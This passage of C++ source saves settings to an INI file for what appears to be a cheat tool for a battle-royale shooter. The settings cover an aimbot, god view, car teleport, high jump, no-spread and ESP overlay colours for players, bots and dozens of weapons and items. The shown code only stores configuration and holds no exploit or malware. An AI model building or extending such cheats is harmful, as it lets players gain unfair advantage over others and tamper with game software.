	ini.SetLongValue("GodView Left", "Value", Setting::GodLeft);
	ini.SetLongValue("GodView Right", "Value", Setting::GodRight);


	ini.SetBoolValue("Quick Loot", "Enabled", Setting::Quickloot); //For Writing Bool
	ini.SetBoolValue("Fast Switch", "Enabled", Setting::FastSwitchWeapon); //For Writing Bool

	ini.SetBoolValue("Scope Zoom", "Enabled", Setting::ScopeZoom); //For Writing Bool
	ini.SetLongValue("Scope Zoom Value", "Value", Setting::scopefov); //For Writing Values

	ini.SetBoolValue("Small Crosshair", "Enabled", Setting::noSpread); //For Writing Bool
	ini.SetBoolValue("Force TPP", "Enabled", Setting::ForceTPP); //For Writing Bool
	ini.SetBoolValue("carteleport", "Enabled", Setting::carteleport); //For Writing Bool
	ini.SetLongValue("carteleportkey", "Value", Setting::carteleportkey); //For Writing Values


	ini.SetBoolValue("Enabled", "Enabled", Setting::Aimbot);
	ini.SetBoolValue("high jump", "Enabled", Setting::highjump); //For Writing Bool
	ini.SetBoolValue("high jumpv1", "Enabled", Setting::highjumpv1); //For Writing Bool
	ini.SetBoolValue("high jumpv2", "Enabled", Setting::highjump2); //For Writing Bool
	ini.SetLongValue("highjumpv1 Value", "Value", Setting::highjumpv); //For Writing Values
	ini.SetLongValue("highjumpv2 Value", "Value", Setting::highjumpv2); //For Writing Values


	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("fovcirclecolor", str.append(std::to_string(i)).c_str(), fround(Setting::fovcirclecolor[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("magicline", str.append(std::to_string(i)).c_str(), fround(Setting::magicline[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("vehcolor", str.append(std::to_string(i)).c_str(), fround(Setting::vehcolor[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("pnamecolorcolor", str.append(std::to_string(i)).c_str(), fround(Setting::pnamecolorcolor[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("botnamecolorcolor", str.append(std::to_string(i)).c_str(), fround(Setting::botnamecolorcolor[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("bdistancecolor", str.append(std::to_string(i)).c_str(), fround(Setting::bdistancecolor[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("pdistancecolor", str.append(std::to_string(i)).c_str(), fround(Setting::pdistancecolor[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("bonecolor", str.append(std::to_string(i)).c_str(), fround(Setting::bonecolor[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("pBoxcolor", str.append(std::to_string(i)).c_str(), fround(Setting::pBoxcolor[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("plinecolor", str.append(std::to_string(i)).c_str(), fround(Setting::plinecolor[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("botlinecolor", str.append(std::to_string(i)).c_str(), fround(Setting::botlinecolor[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("weaponenemycolor", str.append(std::to_string(i)).c_str(), fround(Setting::weaponenemycolor[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("botweaponenemycolor", str.append(std::to_string(i)).c_str(), fround(Setting::botweaponenemycolor[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("botbonecolor", str.append(std::to_string(i)).c_str(), fround(Setting::botbonecolor[i] * 255)); }


	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_AKM_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_AKM_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_M249_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_M249_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_MG3_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_MG3_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_M762_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_M762_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Mk47Mutant_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Mk47Mutant_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_DP28_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_DP28_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_SCARL_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_SCARL_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_M416_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_M416_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_M16A4_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_M16A4_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_FAMAS_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_FAMAS_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_AN94_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_AN94_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_HoneyBadger_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_HoneyBadger_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_HuntingBow_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_HuntingBow_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_CrossbowBorderland_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_CrossbowBorderland_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_G36C_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_G36C_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_QBZ_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_QBZ_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Groza_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Groza_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_AUG_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_AUG_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_VSS_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_VSS_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Mk12_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Mk12_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Win94_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Win94_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_QBU_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_QBU_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_SLR_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_SLR_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_SKS_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_SKS_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Mini14_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Mini14_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Mk14_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Mk14_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_M24_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_M24_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_AMR_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_AMR_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Awm_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Awm_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Awmimo_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Awmimo_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Kar98k_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Kar98k_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Mosin_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Mosin_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_CrossBow_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_CrossBow_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_CrossBow_Quick_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_CrossBow_Quick_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_SawedOff_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_SawedOff_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_M1014_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_M1014_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Neostead_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Neostead_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_S1897_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_S1897_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_S686_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_S686_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_DBS_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_DBS_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_S12K_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_S12K_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Cowbar_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Cowbar_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Machete_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Machete_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Sickle_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Sickle_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Pan_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Pan_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_DesertEagle_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_DesertEagle_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_P1911_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_P1911_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_R45_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_R45_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_P18C_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_P18C_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_P92_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_P92_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_R1895_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_R1895_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_FlareGun_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_FlareGun_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Vertical_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Vertical_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_HalfGrip_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_HalfGrip_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_LightGrip_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_LightGrip_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Angled_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Angled_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Lasersight_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Lasersight_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_ThumbGrip_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_ThumbGrip_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Mid_FlashHider_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Mid_FlashHider_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Large_FlashHider_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Large_FlashHider_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Large_Compensator_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Large_Compensator_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Mid_Compensator_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Mid_Compensator_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Taktik_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Taktik_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Duckbill_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Duckbill_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Sniper_FlashHider_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Sniper_FlashHider_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Mid_Suppressor_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Mid_Suppressor_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Chekpad_Sniper_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Chekpad_Sniper_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Choke_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Choke_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Micro_UZI_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Micro_UZI_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Sniper_Compensator_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Sniper_Compensator_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Sniper_Suppressor_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Sniper_Suppressor_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Large_Suppressor_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Large_Suppressor_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Sniper_Quick_Extended_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Sniper_Quick_Extended_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Sniper_Quick_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Sniper_Quick_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_AR_Quick_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_AR_Quick_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_AR_Extended_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_AR_Extended_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_SMG_Quick_Extended_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_SMG_Quick_Extended_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_SMG_Extended_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_SMG_Extended_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_SMG_Quick_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_SMG_Quick_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_WorldCup_Box_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_WorldCup_Box_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Football_Grenade_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Football_Grenade_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Football_Cloth_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Football_Cloth_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Golden_Boot_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Golden_Boot_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_MiniGameMachine_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_MiniGameMachine_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_BlindBoxMachine_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_BlindBoxMachine_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_GameCoin_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_GameCoin_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Benzin_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Benzin_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_PP19_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_PP19_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_P90_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_P90_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_TommyGun_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_TommyGun_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_MP5K_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_MP5K_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_UMP9_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_UMP9_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Vector_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Vector_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Uzi_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Uzi_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_762mm_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_762mm_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_556mm_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_556mm_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_9mm_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_9mm_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_45ACP_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_45ACP_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Flare_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Flare_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_12Guage_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_12Guage_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Ammo_Bolt_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Ammo_Bolt_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Lazer_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Lazer_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Holo_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Holo_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_x2_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_x2_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_x3_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_x3_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_x4_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_x4_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_x6_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_x6_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_x8_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_x8_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Bag1_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Bag1_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Bag2_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Bag2_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Bag3_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Bag3_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Armor1_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Armor1_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Armor2_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Armor2_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Armor3_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Armor3_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Helmet1_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Helmet1_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Helmet2_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Helmet2_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Helmet3_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Helmet3_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Frag_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Frag_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Frag_Warn_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Frag_Warn_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Smoke_Warn_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Smoke_Warn_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Smoke_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Smoke_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Molotof_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Molotof_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Molotof_Warn_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Molotof_Warn_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Grenade_Apple_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Grenade_Apple_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_MedKit_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_MedKit_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_FirstAidKit_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_FirstAidKit_Color[i] * 255)); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; ini.SetLongValue("Esp_Item_Painkiller_Color", str.append(std::to_string(i)).c_str(), fround(Setting::Esp_Item_Painkiller_Color[i] * 255)); }
